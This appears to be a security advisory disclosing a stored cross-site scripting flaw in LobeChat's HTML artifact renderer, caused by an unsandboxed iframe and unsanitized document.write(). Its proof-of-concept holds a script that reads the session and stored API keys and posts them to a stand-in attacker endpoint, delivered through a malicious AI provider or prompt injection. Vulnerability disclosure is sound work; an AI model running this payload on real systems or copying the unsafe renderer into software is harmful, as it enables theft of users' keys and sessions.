content:
### Summary
a unsandboxed `iframe` combined with unsanitized `document.write()` in the HTML artifact renderer allows any ai response containing a `text/html` artifact to eexcute arbitrary javascript at the LobeChat application origin. because artifacts are stored in the database and rendered to every user who opens the conversation, this is a stored cross-site scripting vulnerability that can (without the user knowingly) exfiltrate all userconfigured API keys, session tokens, and perform authenticated actions on behalf of the victim with no user interaction except for opening a chat.

### Details
when a chat message contains a `text/html` `lobeArtifact` block, LobeChat renders it inside an `<iframe>` using `document.write()`. some issue with this:  

1. No sandbox attribute on the iframe
`src/features/Portal/Artifacts/Body/Renderer/HTML.tsx`
```tsx
return (
  <iframe
    ref={iframeRef}
    style={{ border: 'none', height, width }}
    title="html-renderer"
    // no sandbox, iframe inherits parent's origin.
  />
);
```

without `sandbox`, the iframe runs in the same origin as the LobeChat application. scripts inside it can read `document.cookie`, access `localStorage`, and call any same-origin API endpoint with the user's full authentication context.  

2. raw `document.write()` with no sanitization.  

```tsx
// src/features/Portal/Artifacts/Body/Renderer/HTML.tsx
useEffect(() => {
  const doc = iframeRef.current?.contentDocument;
  if (!doc) return;
  doc.open();
  doc.write(htmlContent);   // ← htmlContent is the raw artifact body from the database.
  doc.close();
}, [htmlContent]);
```

`htmlContent` is the verbatim content stored from the AI response, no call to DOMPurify or any other sanitization library before writing.  

the artifact content originates from an AI model response. a attacker who can influence that response, for example by operating a malicious OpenAI-compatible API endpoint that the victim has configured, or by conducting prompt injection on a shared provider, or simply by sharing a conversation link, can deliver arbitrary htmk+javascript to any viewer. and once stored, the payload executes for every user who opens the conversation or accesses a shared topic link.


### PoC
```
<lobeArtifact identifier="hi" type="text/html" title="poc">
<html><body>
<script>
(async () => {
  // session
  const session = await fetch('/api/auth/session').then(r => r.json());

  // api keys
  const settings = await fetch('/api/user/settings').then(r => r.json());

  // send to attacker
  await fetch('https://hello.poc.com/evil-endpoint', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      origin: location.origin,
      user: session?.user,
      keyVaults: settings?.keyVaults,
    }),
  });
})();
</script>
</body></html>
</lobeArtifact>
```

1. in LobeChat Settings, add a custom AI provider pointing to an attacker-controlled server that returns the above JSON as a chat completion response.
2. start new conversation and send any message.
3. the AI response containing the artifact is stored in the database.
4. open the Artifact panel for that message.
5. observe in the browser devtools Network tab: requests to `/api/auth/session` and `/api/user/settings` are made from the artifact iframe and their responses are sent to the attacker's server.

### Impact
Stored Cross-Site Scripting (XSS).  
#### impacted people:

- all users of self-hosted LobeChat instances in multi-user mode who view a conversation or shared topic containing a malicious HTML artifact
- single user deployments are impacted if the user's AI provider is compromised or prompt injection is possible.

#### what attacker can do:

- steal API keys
- impersonate victim: read cookies and session tokens to impersonate the victim on the platform.
- persistentt access: write to `localStorage`/`IndexedDB` for persistence across sessions.
- dump conversation history: call the messages/topics tRPC endpoints as the victim.
- alot more

because the payload is stored, a single injection event affects all future viewers of the conversation, including other users on a shared instance who receive a link.
